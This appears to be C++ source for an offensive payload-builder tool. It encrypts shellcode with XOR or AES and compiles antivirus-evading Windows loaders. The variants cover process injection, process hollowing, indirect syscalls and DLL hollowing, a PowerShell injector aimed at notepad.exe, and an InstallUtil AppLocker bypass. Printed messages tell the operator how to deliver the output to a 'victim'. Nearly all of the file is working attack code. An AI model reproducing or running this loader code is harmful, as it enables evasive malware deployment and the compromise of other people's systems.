#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstdlib>
#include <random>
#include <cstring>
#include <openssl/aes.h>
#include <openssl/sha.h>
#include <openssl/evp.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sstream>

// ANSI color codes
const std::string GREEN = "\033[92m";
const std::string BOLD = "\033[1m";
const std::string WHITE = "\033[97m";
const std::string RED = "\033[91m";
const std::string MAGENTA = "\033[95m";
const std::string YELLOW = "\033[93m";
const std::string RESET = "\033[0m";

std::string payload_name;

// Function to read binary file
std::vector<unsigned char> readBinaryFile(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary);
    if (!file) {
        std::cerr << "Error: Could not open file " << filename << std::endl;
        exit(1);
    }

    file.seekg(0, std::ios::end);
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<unsigned char> buffer(fileSize);
    file.read(reinterpret_cast<char*>(buffer.data()), fileSize);

    return buffer;
}

// Function to write binary file
void writeBinaryFile(const std::string& filename, const std::vector<unsigned char>& data) {
    std::ofstream file(filename, std::ios::binary);
    if (!file) {
        std::cerr << "Error: Could not create file " << filename << std::endl;
        exit(1);
    }

    file.write(reinterpret_cast<const char*>(data.data()), data.size());
}

// XOR encryption function
std::vector<unsigned char> xorEncrypt(const std::vector<unsigned char>& plaintext, const std::vector<unsigned char>& key) {
    std::cout << "\n";

    std::vector<unsigned char> ciphertext(plaintext.size());
    for (size_t i = 0; i < plaintext.size(); i++) {
        // XOR each byte with the key in a repeating pattern
        ciphertext[i] = plaintext[i] ^ key[i % key.size()];
    }

    return ciphertext;
}

// Generate random key
std::vector<unsigned char> generateRandomKey(size_t length) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distrib(0, 255);

    std::vector<unsigned char> key(length);
    for (size_t i = 0; i < length; i++) {
        key[i] = static_cast<unsigned char>(distrib(gen));
    }

    return key;
}

// SHA-256 hash function
std::vector<unsigned char> sha256(const std::vector<unsigned char>& data) {
    std::vector<unsigned char> hash(SHA256_DIGEST_LENGTH);
    SHA256_CTX sha256;
    SHA256_Init(&sha256);
    SHA256_Update(&sha256, data.data(), data.size());
    SHA256_Final(hash.data(), &sha256);
    return hash;
}

// AES encryption function
std::pair<std::vector<unsigned char>, std::vector<unsigned char>> AESencrypt(
    const std::vector<unsigned char>& plaintext,
    const std::vector<unsigned char>& key) {

    // Derive the AES key using SHA-256
    std::vector<unsigned char> k = sha256(key);

    // Create initialization vector (16 bytes, zeroed)
    std::vector<unsigned char> iv(16, 0);

    // Pad the plaintext to a multiple of AES block size
    size_t paddedSize = ((plaintext.size() + AES_BLOCK_SIZE) / AES_BLOCK_SIZE) * AES_BLOCK_SIZE;
    std::vector<unsigned char> paddedPlaintext = plaintext;
    size_t paddingBytes = paddedSize - plaintext.size();
    paddedPlaintext.resize(paddedSize, static_cast<unsigned char>(paddingBytes));

    // Encrypt using AES-CBC
    std::vector<unsigned char> ciphertext(paddedSize);
    AES_KEY aesKey;
    AES_set_encrypt_key(k.data(), 256, &aesKey);
    AES_cbc_encrypt(paddedPlaintext.data(), ciphertext.data(), paddedSize, &aesKey, iv.data(), AES_ENCRYPT);

    return {ciphertext, key};
}

// AES encryption with custom IV
std::tuple<std::vector<unsigned char>, std::vector<unsigned char>, std::vector<unsigned char>>
AESencrypt_with_iv(
    const std::vector<unsigned char>& plaintext,
    const std::vector<unsigned char>& key,
    const std::vector<unsigned char>& iv) {

    // Derive the AES key using SHA-256
    std::vector<unsigned char> k = sha256(key);

    // Pad the plaintext to a multiple of AES block size
    size_t paddedSize = ((plaintext.size() + AES_BLOCK_SIZE) / AES_BLOCK_SIZE) * AES_BLOCK_SIZE;
    std::vector<unsigned char> paddedPlaintext = plaintext;
    size_t paddingBytes = paddedSize - plaintext.size();
    paddedPlaintext.resize(paddedSize, static_cast<unsigned char>(paddingBytes));

    // Encrypt using AES-CBC with the provided IV
    std::vector<unsigned char> ciphertext(paddedSize);
    AES_KEY aesKey;
    AES_set_encrypt_key(k.data(), 256, &aesKey);

    std::vector<unsigned char> ivCopy = iv; // Create a copy as AES_cbc_encrypt modifies the IV
    AES_cbc_encrypt(paddedPlaintext.data(), ciphertext.data(), paddedSize, &aesKey, ivCopy.data(), AES_ENCRYPT);

    return {ciphertext, key, iv};
}

// Convert bytes to hex string
std::string bytesToHexString(const std::vector<unsigned char>& bytes) {
    std::stringstream ss;
    for (size_t i = 0; i < bytes.size(); i++) {
        if (i > 0) ss << ", ";
        ss << "0x" << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(bytes[i]);
    }
    return ss.str();
}

// Execute a command and return its output
std::string executeCommand(const std::string& command) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(command.c_str(), "r"), pclose);

    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }

    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }

    return result;
}

// Function to remove a file
void removeFile(const std::string& filename) {
    std::remove(filename.c_str());
}

// Copy a file from source to destination
void copyFile(const std::string& source, const std::string& destination) {
    std::ifstream src(source, std::ios::binary);
    if (!src) {
        std::cerr << "Error: Could not open source file " << source << std::endl;
        exit(1);
    }

    std::ofstream dst(destination, std::ios::binary);
    if (!dst) {
        std::cerr << "Error: Could not create destination file " << destination << std::endl;
        exit(1);
    }

    dst << src.rdbuf();
}

// Read a text file, replace placeholders, and write to destination
void processTemplateFile(const std::string& source, const std::string& destination,
                        const std::vector<std::pair<std::string, std::string>>& replacements) {
    std::ifstream src(source);
    if (!src) {
        std::cerr << "Error: Could not open source file " << source << std::endl;
        exit(1);
    }

    std::string content((std::istreambuf_iterator<char>(src)), std::istreambuf_iterator<char>());

    for (const auto& replacement : replacements) {
        size_t pos = content.find(replacement.first);
        if (pos != std::string::npos) {
            content.replace(pos, replacement.first.length(), replacement.second);
        }
    }

    std::ofstream dst(destination, std::ios::binary);
    if (!dst) {
        std::cerr << "Error: Could not create destination file " << destination << std::endl;
        exit(1);
    }

    dst.write(content.c_str(), content.size());
}

// HAVOCone implementation
void HAVOCone() {
    std::cout << GREEN << BOLD << "[*] Starting HAVOCone..." << RESET << std::endl;

    // Read the payload file
    std::vector<unsigned char> content = readBinaryFile(payload_name);

    // Generate random key and encrypt content
    std::vector<unsigned char> key = generateRandomKey(16);
    std::vector<unsigned char> ciphertext = xorEncrypt(content, key);

    // Write key and encrypted code to files
    writeBinaryFile("key.bin", key);
    writeBinaryFile("code.bin", ciphertext);

    // Create resources.rc file
    std::ofstream resourceFile("resources.rc");
    resourceFile << "saicode56   RCDATA   \"code.bin\"\n";
    resourceFile << "saikey1    RCDATA   \"key.bin\"\n";
    resourceFile.close();

    // Copy the C++ file from evasion_techniques
    copyFile("evasion_techniques/xoxo.cpp", "xoxo.cpp");

    // Compile the code
    int result1 = system("x86_64-w64-mingw32-windres resources.rc -O coff -o resources.res");
    int result2 = system("x86_64-w64-mingw32-g++ --static -o sai_xor.exe xoxo.cpp resources.res -fpermissive -lws2_32");

    if (result1 == 0 && result2 == 0) {
        std::cout << GREEN << BOLD << "[*] Payload successfully created as sai_xor.exe" << RESET << std::endl;
    } else {
        std::cerr << "Error: Compilation failed" << std::endl;
    }

    // Clean up temporary files
    std::vector<std::string> files = {"code.bin", "key.bin", "resources.res", "resources.rc", "xoxo.cpp"};
    for (const auto& file : files) {
        removeFile(file);
    }
}

// HAVOCtwo implementation
void HAVOCtwo() {
    std::cout << GREEN << BOLD << "[*] Starting HAVOCtwo..." << RESET << std::endl;

    // Read the payload file
    std::vector<unsigned char> content = readBinaryFile(payload_name);

    // Generate random key and encrypt content
    std::vector<unsigned char> KEY = generateRandomKey(16);
    auto [ciphertext, key] = AESencrypt(content, KEY);

    // Write key and encrypted code to files
    writeBinaryFile("key.bin", KEY);
    writeBinaryFile("code.bin", ciphertext);

    // Create resources.rc file
    std::ofstream resourceFile("resources.rc");
    resourceFile << "saicode56   RCDATA   \"code.bin\"\n";
    resourceFile << "saikey1    RCDATA   \"key.bin\"\n";
    resourceFile.close();

    // Copy the C++ file from evasion_techniques
    copyFile("evasion_techniques/kumaes.cpp", "AESbypass.cpp");

    // Compile the code
    int result1 = system("x86_64-w64-mingw32-windres resources.rc -O coff -o resources.res");
    int result2 = system("x86_64-w64-mingw32-g++ --static -o sai_AES.exe AESbypass.cpp resources.res -fpermissive -lws2_32");

    if (result1 == 0 && result2 == 0) {
        std::cout << GREEN << BOLD << "[*] Payload successfully created as sai_AES.exe" << RESET << std::endl;
    } else {
        std::cerr << "Error: Compilation failed" << std::endl;
    }

    // Clean up temporary files
    std::vector<std::string> files = {"code.bin", "key.bin", "resources.res", "resources.rc", "AESbypass.cpp"};
    for (const auto& file : files) {
        removeFile(file);
    }
}

// HAVOCfour implementation
void HAVOCfour() {
    std::cout << GREEN << BOLD << "[*] Starting HAVOCfour..." << RESET << std::endl;

    // Read the payload file
    std::vector<unsigned char> content = readBinaryFile(payload_name);

    // Generate random key and encrypt content
    std::vector<unsigned char> key = generateRandomKey(16);
    std::vector<unsigned char> ciphertext = xorEncrypt(content, key);

    // Write key and encrypted code to files
    writeBinaryFile("key.bin", key);
    writeBinaryFile("code.bin", ciphertext);

    // Create resources.rc file
    std::ofstream resourceFile("resources.rc");
    resourceFile << "saicode56   RCDATA   \"code.bin\"\n";
    resourceFile << "saikey1    RCDATA   \"key.bin\"\n";
    resourceFile.close();

    // Copy the C++ file from evasion_techniques
    copyFile("evasion_techniques/procinj2.cpp", "Processinj_XOR.cpp");

    // Compile the code
    int result1 = system("x86_64-w64-mingw32-windres resources.rc -O coff -o resources.res");
    int result2 = system("x86_64-w64-mingw32-g++ --static -o sai_spoolsv.exe Processinj_XOR.cpp resources.res -fpermissive -lws2_32");

    if (result1 == 0 && result2 == 0) {
        std::cout << GREEN << BOLD << "[*] Payload successfully created as sai_spoolsv.exe" << RESET << std::endl;
    } else {
        std::cerr << "Error: Compilation failed" << std::endl;
    }

    // Clean up temporary files
    std::vector<std::string> files = {"code.bin", "key.bin", "resources.res", "resources.rc", "Processinj_XOR.cpp"};
    for (const auto& file : files) {
        removeFile(file);
    }
}

// HAVOCsixAES_withhollow implementation
void HAVOCsixAES_withhollow() {
    std::cout << GREEN << BOLD << "[*] Starting HAVOCsixAES_withhollow..." << RESET << std::endl;

    // Read the payload file
    std::vector<unsigned char> content = readBinaryFile(payload_name);

    // Generate random key and encrypt content
    std::vector<unsigned char> KEY = generateRandomKey(16);
    auto [ciphertext, key] = AESencrypt(content, KEY);

    // Convert to hex strings for C++ code
    std::string ciphertext_str = bytesToHexString(ciphertext);
    std::string key_str = bytesToHexString(KEY);

    std::string aeskey = "unsigned char ke185hams[] = { " + key_str + " };";
    std::string aescode = "unsigned char itsthecod345[] = { " + ciphertext_str + " };";

    // Read the template file and replace placeholders
    std::vector<std::pair<std::string, std::string>> replacements = {
        {"unsigned char ke185hams[] = {};", aeskey},
        {"unsigned char itsthecod345[] = {};", aescode}
    };

    processTemplateFile("evasion_techniques/hollow_aes.cpp", "hollow_aes.cpp", replacements);

    // Compile the code
    int result = system("x86_64-w64-mingw32-g++ --static -o sai_hollow.exe hollow_aes.cpp -fpermissive -lws2_32");

    if (result == 0) {
        std::cout << GREEN << BOLD << "[*] Payload successfully created as sai_hollow.exe" << RESET << std::endl;
    } else {
        std::cerr << "Error: Compilation failed" << std::endl;
    }

    // Clean up temporary files
    std::vector<std::string> files = {"hollow_aes.cpp"};
    for (const auto& file : files) {
        removeFile(file);
    }
}

// HAVOCseven_dynamic_sai implementation
void HAVOCseven_dynamic_sai() {
    std::cout << GREEN << BOLD << "[*] Starting HAVOCseven_dynamic_sai..." << RESET << std::endl;

    // Read the payload file
    std::vector<unsigned char> content = readBinaryFile(payload_name);

    // Generate random key and encrypt content
    std::vector<unsigned char> key = generateRandomKey(16);
    std::vector<unsigned char> ciphertext = xorEncrypt(content, key);

    // Write key and encrypted code to files
    writeBinaryFile("key.bin", key);
    writeBinaryFile("code.bin", ciphertext);

    // Create resources.rc file
    std::ofstream resourceFile("resources.rc");
    resourceFile << "saicode56   RCDATA   \"code.bin\"\n";
    resourceFile << "saikey1    RCDATA   \"key.bin\"\n";
    resourceFile.close();

    // Copy the C++ file from evasion_techniques
    copyFile("evasion_techniques/hollow_dynamic.cpp", "hollow.cpp");

    // Compile the code
    int result1 = system("x86_64-w64-mingw32-windres resources.rc -O coff -o resources.res");
    int result2 = system("x86_64-w64-mingw32-g++ --static -o sai_selfdelete.exe hollow.cpp resources.res -fpermissive -lws2_32");

    if (result1 == 0 && result2 == 0) {
        std::cout << GREEN << BOLD << "[*] Payload successfully created as sai_selfdelete.exe" << RESET << std::endl;
    } else {
        std::cerr << "Error: Compilation failed" << std::endl;
    }

    // Clean up temporary files
    std::vector<std::string> files = {"code.bin", "key.bin", "resources.res", "resources.rc", "hollow.cpp"};
    for (const auto& file : files) {
        removeFile(file);
    }
}

// HAVOCeightAES_hollow_dll implementation
void HAVOCeightAES_hollow_dll() {
    std::cout << GREEN << BOLD << "[*] Starting HAVOCeightAES_hollow_dll..." << RESET << std::endl;

    // Read the payload file
    std::vector<unsigned char> content = readBinaryFile(payload_name);

    // Generate random key and encrypt content
    std::vector<unsigned char> KEY = generateRandomKey(16);
    auto [ciphertext, key] = AESencrypt(content, KEY);

    // Convert to hex strings for C++ code
    std::string ciphertext_str = bytesToHexString(ciphertext);
    std::string key_str = bytesToHexString(KEY);

    std::string aeskey = "unsigned char ke185hams[] = { " + key_str + " };";
    std::string aescode = "unsigned char itsthecod345[] = { " + ciphertext_str + " };";

    // Copy process.cpp
    copyFile("evasion_techniques/dll/process.cpp", "process.cpp");

    // Read the template file and replace placeholders
    std::vector<std::pair<std::string, std::string>> replacements = {
        {"unsigned char ke185hams[] = {};", aeskey},
        {"unsigned char itsthecod345[] = {};", aescode}
    };

    processTemplateFile("evasion_techniques/dll/dll_dynamic_hollow.cpp", "hollow_aes_dll.cpp", replacements);

    // Compile the code
    int result1 = system("x86_64-w64-mingw32-g++ -shared -o saigowda.dll hollow_aes_dll.cpp -lws2_32 -lwinhttp -lcrypt32 -static-libgcc -static-libstdc++ -fpermissive");
    int result2 = system("x86_64-w64-mingw32-g++ --static -o sai_dll.exe process.cpp -fpermissive");

    if (result1 == 0 && result2 == 0) {
        std::cout << GREEN << BOLD << "[*] Payload successfully created as sai_dll.exe and saigowda.dll" << RESET << std::endl;
        std::cout << GREEN << BOLD << "[*] Transfer both the executable and the dll on the victim in the same directory, execute sai_havocdll.exe" << RESET << std::endl;
    } else {
        std::cerr << "Error: Compilation failed" << std::endl;
    }

    // Clean up temporary files
    std::vector<std::string> files = {"hollow_aes_dll.cpp", "process.cpp"};
    for (const auto& file : files) {
        removeFile(file);
    }
}

// HAVOCnine_enc implementation
void HAVOCnine_enc() {
    std::cout << GREEN << BOLD << "[*] Starting HAVOCnine_enc..." << RESET << std::endl;

    // Read the payload file
    std::vector<unsigned char> content = readBinaryFile(payload_name);

    // Generate random key and encrypt content
    std::vector<unsigned char> key = generateRandomKey(16);
    std::vector<unsigned char> ciphertext = xorEncrypt(content, key);

    // Write key and encrypted code to files
    writeBinaryFile("key.bin", key);
    writeBinaryFile("code.bin", ciphertext);

    // Create resources.rc file
    std::ofstream resourceFile("resources.rc");
    resourceFile << "saicode56   RCDATA   \"code.bin\"\n";
    resourceFile << "saikey1    RCDATA   \"key.bin\"\n";
    resourceFile.close();

    // Copy the C++ file from evasion_techniques
    copyFile("evasion_techniques/procinj_enc.cpp", "Processinj_XOR.cpp");

    // Compile the code
    int result1 = system("x86_64-w64-mingw32-windres resources.rc -O coff -o resources.res");
    int result2 = system("x86_64-w64-mingw32-g++ --static -o sai_exp.exe Processinj_XOR.cpp resources.res -fpermissive -lws2_32");

    if (result1 == 0 && result2 == 0) {
        std::cout << GREEN << BOLD << "[*] Payload successfully created as sai_exp.exe" << RESET << std::endl;
    } else {
        std::cerr << "Error: Compilation failed" << std::endl;
    }

    // Clean up temporary files
    std::vector<std::string> files = {"code.bin", "key.bin", "resources.res", "resources.rc", "Processinj_XOR.cpp"};
    for (const auto& file : files) {
        removeFile(file);
    }
}

// powershell_havocevery implementation
void powershell_havocevery() {
    std::cout << GREEN << BOLD << "[*] Starting powershell_havocevery..." << RESET << std::endl;

    // Read the payload file
    std::vector<unsigned char> content = readBinaryFile(payload_name);

    // Generate random key and encrypt content
    std::vector<unsigned char> key = generateRandomKey(16);
    std::vector<unsigned char> ciphertext = xorEncrypt(content, key);

    // Convert to hex strings for PowerShell code
    std::string ciphertext_str = bytesToHexString(ciphertext);
    std::string key_str = bytesToHexString(key);

    // Create PowerShell script
    std::string ps1_code =
    "$Kernel32 = @\"\n"
    "using System;\n"
    "using System.Runtime.InteropServices;\n"
    "public class Kernel32 {\n"
    "    [DllImport(\"kernel32.dll\", SetLastError = true)]\n"
    "    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n"
    "\n"
    "    [DllImport(\"kernel32.dll\", SetLastError = true)]\n"
    "    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);\n"
    "\n"
    "    [DllImport(\"kernel32.dll\", SetLastError = true)]\n"
    "    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n"
    "\n"
    "    [DllImport(\"kernel32.dll\", SetLastError = true)]\n"
    "    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);\n"
    "\n"
    "    [DllImport(\"kernel32.dll\", SetLastError = true)]\n"
    "    public static extern bool CloseHandle(IntPtr hObject);\n"
    "\n"
    "    [DllImport(\"ntdll.dll\", SetLastError = true)]\n"
    "    public static extern uint ZwUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);\n"
    "}\n"
    "\"@\n"
    "\n"
    "Add-Type $Kernel32\n"
    "\n"
    "# XOR decryption key\n"
    "[Byte[]] $XORkey = " + key_str + "\n"
    "\n"
    "# Encrypted shellcode\n"
    "[Byte[]] $XORshellcode = " + ciphertext_str + "\n"
    "\n"
    "\n"
    "# Target process to hollow\n"
    "$processName = \"notepad.exe\"\n"
    "\n"
    "# Start target process in suspended state\n"
    "$processInfo = New-Object System.Diagnostics.ProcessStartInfo\n"
    "$processInfo.FileName = \"c:\\windows\\system32\\notepad.exe\"\n"
    "$processInfo.CreateNoWindow = $true\n"
    "$processInfo.UseShellExecute = $false\n"
    "$process = [System.Diagnostics.Process]::Start($processInfo)\n"
    "\n"
    "# Get handle to target process\n"
    "$PROCESS_ALL_ACCESS = 0x1F0FFF\n"
    "$hProcess = [Kernel32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $process.Id)\n"
    "\n"
    "# Unmap the target process's memory (if needed)\n"
    "[Kernel32]::ZwUnmapViewOfSection($hProcess, [IntPtr]::Zero)\n"
    "\n"
    "# Allocate memory for the shellcode in the target process\n"
    "$MEM_COMMIT = 0x1000\n"
    "$MEM_RESERVE = 0x2000\n"
    "$PAGE_EXECUTE_READWRITE = 0x40\n"
    "$size = $XORshellcode.Length\n"
    "$addr = [Kernel32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $size, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)\n"
    "\n"
    "for ($i = 0; $i -lt $XORshellcode.Length; $i++) {\n"
    "    $XORshellcode[$i] = $XORshellcode[$i] -bxor $XORkey[$i % $XORkey.Length]\n"
    "}\n"
    "\n"
    "# Write the decrypted shellcode into the allocated memory\n"
    "[UIntPtr]$bytesWritten = [UIntPtr]::Zero\n"
    "$result = [Kernel32]::WriteProcessMemory($hProcess, $addr, $XORshellcode, $size, [ref]$bytesWritten)\n"
    "\n"
    "\n"
    "# Create a remote thread to execute the shellcode\n"
    "$hThread = [Kernel32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)\n"
    "\n"
    "\n"
    "Write-Host \"Letsss goooo Broskiiiii\" -ForegroundColor Green\n"
    "\n"
    "# Clean up\n"
    "[Kernel32]::CloseHandle($hThread)\n"
    "[Kernel32]::CloseHandle($hProcess)\n";

    // Write PowerShell script to file
    std::ofstream ps1File("sai.ps1");
    ps1File << ps1_code;
    ps1File.close();

    std::cout << GREEN << BOLD << "[*] Payload successfully created as sai.ps1" << RESET << std::endl;
}

// enumpagew implementation
void enumpagew() {
    std::cout << GREEN << BOLD << "[*] Starting enumpagew..." << RESET << std::endl;

    // Read the payload file
    std::vector<unsigned char> content = readBinaryFile(payload_name);

    // Generate random key, IV and encrypt content
    std::vector<unsigned char> KEY = generateRandomKey(16);
    std::vector<unsigned char> iv = generateRandomKey(16);

    auto [ciphertext, key, ivOut] = AESencrypt_with_iv(content, KEY, iv);

    // Convert to hex strings for C++ code
    std::string ciphertext_str = bytesToHexString(ciphertext);
    std::string key_str = bytesToHexString(KEY);
    std::string iv_str = bytesToHexString(iv);

    std::string aeskey = "unsigned char ke185hams[] = { " + key_str + " };";
    std::string aescode = "unsigned char itsthecod345[] = { " + ciphertext_str + " };";
    std::string aesiv = "unsigned char AESiv[] = { " + iv_str + " };";

    // Read the template file and replace placeholders
    std::vector<std::pair<std::string, std::string>> replacements = {
        {"unsigned char ke185hams[] = {};", aeskey},
        {"unsigned char itsthecod345[] = {};", aescode},
        {"unsigned char AESiv[] = {};", aesiv}
    };

    processTemplateFile("evasion_techniques/enumpage.cpp", "hollow_aes.cpp", replacements);

    // Compile the code
    int result = system("x86_64-w64-mingw32-g++ --static -o sai_12.exe hollow_aes.cpp -fpermissive -lws2_32");

    if (result == 0) {
        std::cout << GREEN << BOLD << "[*] Payload successfully created as sai_12.exe" << RESET << std::endl;
    } else {
        std::cerr << "Error: Compilation failed" << std::endl;
    }

    // Clean up temporary files
    std::vector<std::string> files = {"hollow_aes.cpp"};
    for (const auto& file : files) {
        removeFile(file);
    }
}

// indirect implementation
void indirect() {
    std::cout << GREEN << BOLD << "[*] Starting indirect..." << RESET << std::endl;

    // Read the payload file
    std::vector<unsigned char> content = readBinaryFile(payload_name);

    // Generate random key and encrypt content
    std::vector<unsigned char> KEY = generateRandomKey(16);
    auto [ciphertext, key] = AESencrypt(content, KEY);

    // Convert to hex strings for C++ code
    std::string ciphertext_str = bytesToHexString(ciphertext);
    std::string key_str = bytesToHexString(KEY);

    std::string aeskey = "unsigned char AESkey[] = { " + key_str + " };";
    std::string aescode = "unsigned char cool[] = { " + ciphertext_str + " };";

    // Read and modify indirect.c
    std::vector<std::pair<std::string, std::string>> replacements = {
        {"unsigned char AESkey[] = {};", aeskey},
        {"unsigned char cool[] = {};", aescode}
    };

    processTemplateFile("evasion_techniques/indirect/indirect.c", "indirect.c", replacements);

    // Copy syscalls.asm and syscalls.h
    copyFile("evasion_techniques/indirect/syscalls.asm", "syscalls.asm");
    copyFile("evasion_techniques/indirect/syscalls.h", "syscalls.h");

    // Compile the code
    int result1 = system("uasm -win64 syscalls.asm -Fo=syscalls.obj");
    int result2 = system("x86_64-w64-mingw32-gcc -c indirect.c -o sai.obj");
    int result3 = system("x86_64-w64-mingw32-gcc sai.obj syscalls.o -o sai_indirect.exe");

    if (result1 == 0 && result2 == 0 && result3 == 0) {
        std::cout << GREEN << BOLD << "[*] Payload successfully created as sai_indirect.exe" << RESET << std::endl;
    } else {
        std::cerr << "Error: Compilation failed" << std::endl;
    }

    // Clean up temporary files
    std::vector<std::string> files = {"syscalls.asm", "indirect.c", "syscalls.h", "syscalls.o", "sai.obj"};
    for (const auto& file : files) {
        removeFile(file);
    }
}

// indirect2 implementation
void indirect2() {
    std::cout << GREEN << BOLD << "[*] Starting indirect2..." << RESET << std::endl;

    // Read the payload file
    std::vector<unsigned char> content = readBinaryFile(payload_name);

    // Generate random key and encrypt content
    std::vector<unsigned char> KEY = generateRandomKey(16);
    auto [ciphertext, key] = AESencrypt(content, KEY);

    // Convert to hex strings for C++ code
    std::string ciphertext_str = bytesToHexString(ciphertext);
    std::string key_str = bytesToHexString(KEY);

    std::string aeskey = "unsigned char AESkey[] = { " + key_str + " };";
    std::string aescode = "unsigned char cool[] = { " + ciphertext_str + " };";

    // Read and modify indi_ker_ntdll.cpp
    std::vector<std::pair<std::string, std::string>> replacements = {
        {"unsigned char AESkey[] = {};", aeskey},
        {"unsigned char cool[] = {};", aescode}
    };

    processTemplateFile("evasion_techniques/indirect/indi_ker_ntdll.cpp", "indirect.c", replacements);

    // Copy syscalls.asm and syscalls.h
    copyFile("evasion_techniques/indirect/syscalls.asm", "syscalls.asm");
    copyFile("evasion_techniques/indirect/syscalls.h", "syscalls.h");

    // Compile the code
    int result1 = system("uasm -win64 syscalls.asm -Fo=syscalls.obj");
    int result2 = system("x86_64-w64-mingw32-gcc -c indirect.c -o sai.obj");
    int result3 = system("x86_64-w64-mingw32-gcc sai.obj syscalls.o -o sai_indirect_2.exe");

    if (result1 == 0 && result2 == 0 && result3 == 0) {
        std::cout << GREEN << BOLD << "[*] Payload successfully created as sai_indirect_2.exe" << RESET << std::endl;
    } else {
        std::cerr << "Error: Compilation failed" << std::endl;
    }

    // Clean up temporary files
    std::vector<std::string> files = {"syscalls.asm", "indirect.c", "syscalls.h", "syscalls.o", "sai.obj"};
    for (const auto& file : files) {
        removeFile(file);
    }
}

// AppLocker bypass implementation (InstallUtil)
void applocker_installutil() {
    std::cout << GREEN << BOLD << "[*] Starting applocker_installutil..." << RESET << std::endl;

    // Read the payload file
    std::vector<unsigned char> content = readBinaryFile(payload_name);

    // Generate random key and encrypt content
    std::vector<unsigned char> key = generateRandomKey(16);
    std::vector<unsigned char> ciphertext = xorEncrypt(content, key);

    // Convert to hex strings for C# code
    std::string ciphertext_str = bytesToHexString(ciphertext);
    std::string key_str = bytesToHexString(key);

    // Create the C# code with the encrypted shellcode and key
    std::string installutil = 
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        "using System.Configuration.Install;\n"
        "using System.Diagnostics;\n"
        "\n"
        "public class Program\n"
        "{\n"
        "    public static void Main()\n"
        "    {\n"
        "        Console.WriteLine(\"Nothing to see here...\");\n"
        "    }\n"
        "}\n"
        "\n"
        "public class Bypass : System.Configuration.Install.Installer\n"
        "{\n"
        "    [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\n"
        "    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);\n"
        "\n"
        "    [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\n"
        "    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n"
        "\n"
        "    [DllImport(\"kernel32.dll\")]\n"
        "    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);\n"
        "\n"
        "    [DllImport(\"kernel32.dll\")]\n"
        "    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);\n"
        "\n"
        "    [DllImport(\"kernel32.dll\", SetLastError = true)]\n"
        "    static extern bool CloseHandle(IntPtr hObject);\n"
        "\n"
        "    public override void Uninstall(System.Collections.IDictionary savedState)\n"
        "    {\n"
        "        string targetProcess = \"notepad.exe\"; // Target process\n"
        "        byte[] encryptedShellcode = new byte[] { " + ciphertext_str + " };\n"
        "\n"
        "        byte[] key = new byte[] { " + key_str + " };\n"
        "\n"
        "        // Decrypt the shellcode using XOR\n"
        "        byte[] decryptedShellcode = new byte[encryptedShellcode.Length];\n"
        "\n"
        "        Process process = Process.Start(targetProcess);\n"
        "\n"
        "        IntPtr hProcess = OpenProcess(0x1F0FFF, false, process.Id);\n"
        "\n"
        "        IntPtr allocatedMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)decryptedShellcode.Length, 0x3000, 0x40);\n"
        "\n"
        "        for (int i = 0; i < encryptedShellcode.Length; i++)\n"
        "        {\n"
        "            decryptedShellcode[i] = (byte)(encryptedShellcode[i] ^ key[i % key.Length]);\n"
        "        }\n"
        "\n"
        "        IntPtr bytesWritten;\n"
        "        WriteProcessMemory(hProcess, allocatedMemory, decryptedShellcode, (uint)decryptedShellcode.Length, out bytesWritten);\n"
        "\n"
        "        IntPtr threadHandle;\n"
        "        CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, out threadHandle);\n"
        "\n"
        "        CloseHandle(hProcess);\n"
        "    }\n"
        "}\n";

    // Write C# code to file
    std::ofstream csFile("applocker.cs");
    csFile << installutil;
    csFile.close();

    // Compile the code
    int result = system("mcs -r:System.Configuration.Install.dll applocker.cs");

    if (result == 0) {
        std::cout << GREEN << BOLD << "[*] Payload successfully created as applocker.exe" << RESET << std::endl;
        std::cout << GREEN << BOLD << "[*] Run this command 'c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U applocker.exe'" << RESET << std::endl;
    } else {
        std::cerr << "Error: Compilation failed" << std::endl;
        std::cerr << "Make sure to run 'sudo apt install mono-complete' before using option 9" << std::endl;
    }

    // Clean up temporary files
    std::vector<std::string> files = {"applocker.cs"};
    for (const auto& file : files) {
        removeFile(file);
    }
}

// AppLocker bypass implementation for large shellcode (InstallUtil2)
